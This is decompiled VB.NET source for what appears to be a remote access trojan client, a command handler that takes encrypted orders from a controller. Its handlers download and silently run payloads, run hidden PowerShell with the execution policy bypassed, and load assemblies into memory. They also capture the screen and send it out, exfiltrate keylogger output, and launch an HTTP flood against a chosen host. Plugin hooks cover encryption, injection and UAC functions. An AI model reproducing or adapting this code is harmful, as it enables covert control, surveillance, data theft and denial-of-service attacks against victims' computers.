Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Linq
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace Stub
	' Token: 0x0200000A RID: 10
	Public Class Messages
		' Token: 0x06000035 RID: 53 RVA: 0x0000373C File Offset: 0x0000193C
		Public Shared Sub Read(b As Byte())
			Try
				Dim array As String() = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Conversions.ToString(Messages.SPL), -1, CompareMethod.Binary)
				Dim left As String = array(0)
				If Operators.CompareString(left, "rec", False) = 0 Then
					ProcessCritical.CriticalProcesses_Disable()
					Helper.CloseMutex()
					Application.Restart()
					Environment.[Exit](0)
				ElseIf Operators.CompareString(left, "CLOSE", False) = 0 Then
					ProcessCritical.CriticalProcesses_Disable()
					ClientSocket.S.Shutdown(SocketShutdown.Both)
					ClientSocket.S.Close()
					Environment.[Exit](0)
				ElseIf Operators.CompareString(left, "uninstall", False) = 0 Then
					Uninstaller.UNS(False, Nothing, Nothing)
				ElseIf Operators.CompareString(left, "update", False) = 0 Then
					Uninstaller.UNS(True, array(1), Helper.Decompress(Helper.SB(array(2))))
				ElseIf Operators.CompareString(left, "DW", False) = 0 Then
					Messages.RunDisk(array(1), Helper.Decompress(Helper.SB(array(2))))
				ElseIf Operators.CompareString(left, "FM", False) = 0 Then
					Messages.Memory(Helper.Decompress(Helper.SB(array(1))))
				ElseIf Operators.CompareString(left, "LN", False) = 0 Then
					Dim fileName As String = Path.Combine(Path.GetTempPath(), Helper.GetRandomString(6) + array(1))
					Dim webClient As WebClient = New WebClient()
					webClient.DownloadFile(array(2), fileName)
					Process.Start(fileName)
				ElseIf Operators.CompareString(left, "Urlopen", False) = 0 Then
					Messages.OpenUrl(array(1), False)
				ElseIf Operators.CompareString(left, "Urlhide", False) = 0 Then
					Messages.OpenUrl(array(1), True)
				ElseIf Operators.CompareString(left, "PCShutdown", False) = 0 Then
					Interaction.Shell("shutdown.exe /f /s /t 0", AppWinStyle.Hide, False, -1)
				ElseIf Operators.CompareString(left, "PCRestart", False) = 0 Then
					Interaction.Shell("shutdown.exe /f /r /t 0", AppWinStyle.Hide, False, -1)
				ElseIf Operators.CompareString(left, "PCLogoff", False) = 0 Then
					Interaction.Shell("shutdown.exe -L", AppWinStyle.Hide, False, -1)
				ElseIf Operators.CompareString(left, "StartDDos", False) = 0 Then
					Try
						Messages.DDos.Abort()
					Catch ex As Exception
					End Try
					Messages.DDos = New Thread(Sub(a0 As Object)
						Messages.TD(Conversions.ToString(a0))
					End Sub)
					Messages.DDos.Start(array(1))
				ElseIf Operators.CompareString(left, "StopDDos", False) = 0 Then
					Try
						Messages.DDos.Abort()
					Catch ex2 As Exception
					End Try
				ElseIf Operators.CompareString(left, "StartReport", False) = 0 Then
					Try
						Messages.ReportWindow.Abort()
					Catch ex3 As Exception
					End Try
					Messages.ReportWindow = New Thread(Sub(a0 As Object)
						Messages.Monitoring(Conversions.ToString(a0))
					End Sub)
					Messages.ReportWindow.Start(array(1))
				ElseIf Operators.CompareString(left, "StopReport", False) = 0 Then
					Try
						Messages.ReportWindow.Abort()
					Catch ex4 As Exception
					End Try
				ElseIf Operators.CompareString(left, "Xchat", False) = 0 Then
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("Xchat", Messages.SPL), Helper.ID())))
				ElseIf Operators.CompareString(left, "DDos", False) = 0 Then
					ClientSocket.Send("DDos")
				ElseIf Operators.CompareString(left, "ngrok", False) = 0 Then
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok", Messages.SPL), Helper.ID())))
				ElseIf Operators.CompareString(left, "plugin", False) = 0 Then
					Messages.Pack = array
					If Helper.GetValue(array(1)) Is Nothing Then
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("sendPlugin", Messages.SPL), array(1))))
					Else
						Messages.Plugin(Helper.Decompress(Helper.GetValue(array(1))))
					End If
				ElseIf Operators.CompareString(left, "savePlugin", False) = 0 Then
					Dim array2 As Byte() = Helper.SB(array(2))
					Helper.SetValue(array(1), array2)
					Messages.Plugin(Helper.Decompress(array2))
				ElseIf Operators.CompareString(left, "OfflineGet", False) = 0 Then
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("OfflineGet", Messages.SPL), Helper.ID()), Messages.SPL), File.ReadAllText(Settings.LoggerPath))))
				ElseIf Operators.CompareString(left, "$Cap", False) = 0 Then
					Try
						Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
						Dim bounds2 As Rectangle = Screen.PrimaryScreen.Bounds
						Dim bitmap As Bitmap = New Bitmap(bounds2.Width, bounds.Height, PixelFormat.Format16bppRgb555)
						Dim graphics As Graphics = Graphics.FromImage(bitmap)
						Dim blockRegionSize As Size = New Size(bitmap.Width, bitmap.Height)
						graphics.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy)
						Dim memoryStream As MemoryStream = New MemoryStream()
						Dim bitmap2 As Bitmap = New Bitmap(256, 156)
						Dim graphics2 As Graphics = Graphics.FromImage(bitmap2)
						Dim graphics3 As Graphics = graphics2
						Dim image As Image = bitmap
						bounds2 = New Rectangle(0, 0, 256, 156)
						Dim destRect As Rectangle = bounds2
						Dim srcRect As Rectangle = New Rectangle(0, 0, bitmap.Width, bitmap.Height)
						graphics3.DrawImage(image, destRect, srcRect, GraphicsUnit.Pixel)
						bitmap2.Save(memoryStream, ImageFormat.Jpeg)
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("#CAP", Messages.SPL), Helper.ID()), Messages.SPL), Helper.BS(Helper.Compress(memoryStream.ToArray())))))
						Try
							graphics.Dispose()
							memoryStream.Dispose()
							bitmap2.Dispose()
							graphics2.Dispose()
							bitmap.Dispose()
						Catch ex5 As Exception
						End Try
					Catch ex6 As Exception
					End Try
				ElseIf Operators.CompareString(left, "MessageBox", False) = 0 Then
					MessageBox.Show(array(1))
				End If
			Catch ex7 As Exception
				Messages.SendError(ex7.Message)
			End Try
		End Sub

		' Token: 0x06000036 RID: 54 RVA: 0x00003E08 File Offset: 0x00002008
		Public Shared Sub Plugin(B As Byte())
			Try
				For Each type As Type In AppDomain.CurrentDomain.Load(B).GetTypes()
					If Operators.CompareString(type.Name, "Plugin", False) = 0 Then
						For Each instance As MethodInfo In type.GetMethods()
							If Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, Nothing, "Name", New Object(-1) {}, Nothing, Nothing, Nothing), "Run", False) Then
								NewLateBinding.LateCall(instance, Nothing, "Invoke", New Object() { Nothing, New Object() { Settings.Host, Settings.Port, Settings.SPL, Settings.KEY, Helper.ID() } }, Nothing, Nothing, Nothing, True)
								Return
							End If
							If Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, Nothing, "Name", New Object(-1) {}, Nothing, Nothing, Nothing), "RunRecovery", False) Then
								ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject("Recovery" + Settings.SPL + Helper.ID() + Settings.SPL + Conversions.ToString(Convert.ToInt32(Messages.Pack(2))) + Settings.SPL, NewLateBinding.LateGet(instance, Nothing, "Invoke", New Object() { Nothing, New Object() { Convert.ToInt32(Messages.Pack(2)) } }, Nothing, Nothing, Nothing))))
								Return
							End If
							If Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, Nothing, "Name", New Object(-1) {}, Nothing, Nothing, Nothing), "RunOptions", False) Then
								Dim text As String = Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "Invoke", New Object() { Nothing, New Object() { Messages.Pack(2) } }, Nothing, Nothing, Nothing))
								If text.StartsWith("Error") Then
									Messages.SendError(text)
								Else
									Messages.SendMSG(text)
								End If
								Return
							End If
							If Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, Nothing, "Name", New Object(-1) {}, Nothing, Nothing, Nothing), "injRun", False) Then
								If File.Exists(Messages.Pack(2)) Then
									NewLateBinding.LateCall(instance, Nothing, "Invoke", New Object() { Nothing, New Object() { Messages.Pack(2), Helper.Decompress(Helper.SB(Messages.Pack(3))) } }, Nothing, Nothing, Nothing, True)
								End If
								Return
							End If
							If Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, Nothing, "Name", New Object(-1) {}, Nothing, Nothing, Nothing), "UACFunc", False) Then
								Messages.SendError(Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "Invoke", New Object() { Nothing, New Object() { Convert.ToInt32(Messages.Pack(2)) } }, Nothing, Nothing, Nothing)))
								Return
							End If
							If Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, Nothing, "Name", New Object(-1) {}, Nothing, Nothing, Nothing), "ngrok", False) Then
								NewLateBinding.LateCall(instance, Nothing, "Invoke", New Object() { Nothing, New Object() { Messages.Pack(2) } }, Nothing, Nothing, Nothing, True)
								ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok+", Messages.SPL), Helper.ID())))
								Return
							End If
							If Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, Nothing, "Name", New Object(-1) {}, Nothing, Nothing, Nothing), "ENC", False) Then
								If Convert.ToBoolean(Messages.Pack(2)) Then
									If Messages.RS <> 1 Then
										Messages.RS = 1
										Messages.SendMSG(Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "Invoke", New Object() { Nothing, New Object() { Helper.ID(), Helper.Decompress(Helper.SB(Messages.Pack(3))), Messages.Pack(4), Messages.Pack(5), Messages.Pack(6) } }, Nothing, Nothing, Nothing)))
										Messages.RS = 2
									End If
									Return
								End If
							ElseIf Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, Nothing, "Name", New Object(-1) {}, Nothing, Nothing, Nothing), "DEC", False) AndAlso Not Convert.ToBoolean(Messages.Pack(2)) Then
								If Messages.RS = 2 Then
									Messages.RS = 1
									Messages.SendMSG(Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "Invoke", New Object() { Nothing, New Object() { Helper.ID() } }, Nothing, Nothing, Nothing)))
									Messages.RS = 0
								End If
								Return
							End If
						Next
					End If
				Next
			Catch ex As Exception
				Messages.SendError("Plugin Error! " + ex.Message)
			End Try
		End Sub

		' Token: 0x06000037 RID: 55 RVA: 0x0000436C File Offset: 0x0000256C
		Public Shared Sub SendMSG(msg As String)
			Try
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("Msg", Messages.SPL), msg)))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000038 RID: 56 RVA: 0x000043B8 File Offset: 0x000025B8
		Public Shared Sub SendError(msg As String)
			Try
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("Error", Messages.SPL), msg)))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000039 RID: 57 RVA: 0x00004404 File Offset: 0x00002604
		Public Shared Sub TD(Input As String)
			' The following expression was wrapped in a checked-statement
			Try
				Dim Host As String = Input.Split(New Char() { ":"c })(0)
				Dim Port As String = Input.Split(New Char() { ":"c })(1)
				Dim num As Integer = Convert.ToInt32(Input.Split(New Char() { ":"c })(2)) * 60
				Dim t As TimeSpan = TimeSpan.FromSeconds(CDbl(num))
				Dim stopwatch As Stopwatch = New Stopwatch()
				stopwatch.Start()
				While t > stopwatch.Elapsed AndAlso ClientSocket.isConnected
					Dim num2 As Integer = 0
					Do
						Dim thread As Thread = New Thread(Sub()
							Try
								Dim socket As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
								socket.Connect(Host, Convert.ToInt32(Port))
								Dim s As String = String.Concat(New String() { "POST / HTTP/1.1" & vbCrLf & "Host: ", Host, vbCrLf & "Connection: keep-alive" & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "User-Agent: ", Helper.userAgents(New Random().[Next](Helper.userAgents.Length)), vbCrLf & "Content-length: 5235" & vbCrLf & vbCrLf })
								Dim bytes As Byte() = Encoding.UTF8.GetBytes(s)
								socket.Send(bytes, 0, bytes.Length, SocketFlags.None)
								Thread.Sleep(2500)
								socket.Dispose()
							Catch ex As Exception
							End Try
						End Sub)
						thread.Start()
						num2 += 1
					Loop While num2 <= 19
					Thread.Sleep(5000)
				End While
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600003A RID: 58 RVA: 0x000044F4 File Offset: 0x000026F4
		Public Shared Sub Monitoring(Data As String)
			Dim list As List(Of String) = New List(Of String)()
			For Each instance As String In Strings.Split(Data, ",", -1, CompareMethod.Binary)
				list.Add(Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "ToLower", New Object(-1) {}, Nothing, Nothing, Nothing)))
			Next
			Dim num As Integer = 30
			While ClientSocket.isConnected
				For Each process As Process In Process.GetProcesses()
					If Not String.IsNullOrEmpty(process.MainWindowTitle) Then
						If list.Any(New Func(Of String, Boolean)(process.MainWindowTitle.ToLower().Contains)) AndAlso num > 30 Then
							num = 0
							Messages.SendMSG("Open [" + process.MainWindowTitle.ToLower() + "]")
						End If
					End If
				Next
				num += 1
				Thread.Sleep(1000)
			End While
		End Sub

		' Token: 0x0600003B RID: 59 RVA: 0x000045E4 File Offset: 0x000027E4
		Public Shared Sub OpenUrl(Url As String, Hidden As Boolean)
			If Hidden Then
				Try
					ServicePointManager.Expect100Continue = True
					ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
					ServicePointManager.DefaultConnectionLimit = 9999
				Catch ex As Exception
				End Try
				Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create(Url), HttpWebRequest)
				httpWebRequest.UserAgent = Helper.userAgents(New Random().[Next](Helper.userAgents.Length))
				httpWebRequest.AllowAutoRedirect = True
				httpWebRequest.Timeout = 10000
				httpWebRequest.Method = "GET"
				Using CType(httpWebRequest.GetResponse(), HttpWebResponse)
				End Using
			Else
				Process.Start(Url)
			End If
		End Sub

		' Token: 0x0600003C RID: 60
		Public Declare Function capCreateCaptureWindowA Lib "avicap32.dll" (lpszWindowName As String, dwStyle As Integer, X As Integer, Y As Integer, nWidth As Integer, nHeight As Integer, hwndParent As Integer, nID As Integer) As IntPtr

		' Token: 0x0600003D RID: 61
		Public Declare Ansi Function capGetDriverDescriptionA Lib "avicap32.dll" (wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, cbVer As Integer) As Boolean

		' Token: 0x0600003E RID: 62 RVA: 0x000046A4 File Offset: 0x000028A4
		Public Shared Function Cam() As Boolean
			' The following expression was wrapped in a checked-statement
			Try
				Dim num As Integer = 0
				While True
					Dim text As String = Nothing
					Dim wDriver As Short = CShort(num)
					Dim text2 As String = Strings.Space(100)
					If Messages.capGetDriverDescriptionA(wDriver, text2, 100, text, 100) Then
						Exit For
					End If
					num += 1
					If num > 4 Then
						GoTo Block_3
					End If
				End While
				Return True
				Block_3:
			Catch ex As Exception
			End Try
			Return False
		End Function

		' Token: 0x0600003F RID: 63 RVA: 0x00004700 File Offset: 0x00002900
		Private Shared Sub RunDisk(Extension As String, Data As Byte())
			Dim obj As Object = Path.Combine(Path.GetTempPath(), Helper.GetRandomString(6) + Extension)
			File.WriteAllBytes(Conversions.ToString(obj), Data)
			Thread.Sleep(500)
			If Extension.ToLower().EndsWith(".ps1") Then
				Dim process As Process = Process.Start(New ProcessStartInfo("powershell.exe") With { .WindowStyle = ProcessWindowStyle.Hidden, .Arguments = Conversions.ToString(Operators.AddObject(Operators.AddObject("-ExecutionPolicy Bypass -File """, obj), """")) })
			Else
				Dim instance As Object = Nothing
				Dim typeFromHandle As Type = GetType(Process)
				Dim memberName As String = "Start"
				Dim array As Object() = New Object() { RuntimeHelpers.GetObjectValue(obj) }
				Dim arguments As Object() = array
				Dim argumentNames As String() = Nothing
				Dim typeArguments As Type() = Nothing
				Dim array2 As Boolean() = New Boolean() { True }
				NewLateBinding.LateCall(instance, typeFromHandle, memberName, arguments, argumentNames, typeArguments, array2, True)
				If array2(0) Then
					obj = RuntimeHelpers.GetObjectValue(array(0))
				End If
			End If
		End Sub

		' Token: 0x06000040 RID: 64 RVA: 0x000047D4 File Offset: 0x000029D4
		Private Shared Function Memory(buffer As Byte()) As Object
			Try
				Dim assembly As Assembly = AppDomain.CurrentDomain.Load(buffer)
				Dim entryPoint As MethodInfo = assembly.EntryPoint
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))
				Dim parameters As Object() = New Object(0) {}
				If entryPoint.GetParameters().Length = 0 Then
					parameters = Nothing
				End If
				entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), parameters)
			Catch ex As Exception
			End Try
			Dim result As Object
			Return result
		End Function

		' Token: 0x0400001E RID: 30
		Private Shared SPL As Object = RuntimeHelpers.GetObjectValue(ClientSocket.SPL)

		' Token: 0x0400001F RID: 31
		Public Shared Pack As String()

		' Token: 0x04000020 RID: 32
		Public Shared RS As Integer

		' Token: 0x04000021 RID: 33
		Public Shared DDos As Thread

		' Token: 0x04000022 RID: 34
		Public Shared ReportWindow As Thread

		' Token: 0x04000023 RID: 35
		Public Shared Handle As IntPtr
	End Class
End Namespace
